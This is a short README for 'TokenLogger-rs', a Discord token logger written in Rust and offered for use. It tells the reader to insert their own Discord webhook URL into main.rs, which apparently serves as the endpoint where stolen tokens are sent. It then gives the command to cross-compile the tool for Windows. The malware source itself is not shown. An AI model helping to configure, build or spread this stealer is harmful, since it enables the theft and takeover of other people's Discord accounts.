# TokenLogger-rs

#### A Discord Token Logger Written in Rust

On line 12 in [main.rs](https://gitlab.com/XDDudeGuy/tlog/-/blob/main/src/main.rs) (shown below) you must replace the variable with your webhook url

```rust
let url = "Discord Webhook URL";
```

To build just do

```shell
$ cargo build --target x86_64-pc-windows-gnu
```  


Sidenote, I hate strings :3
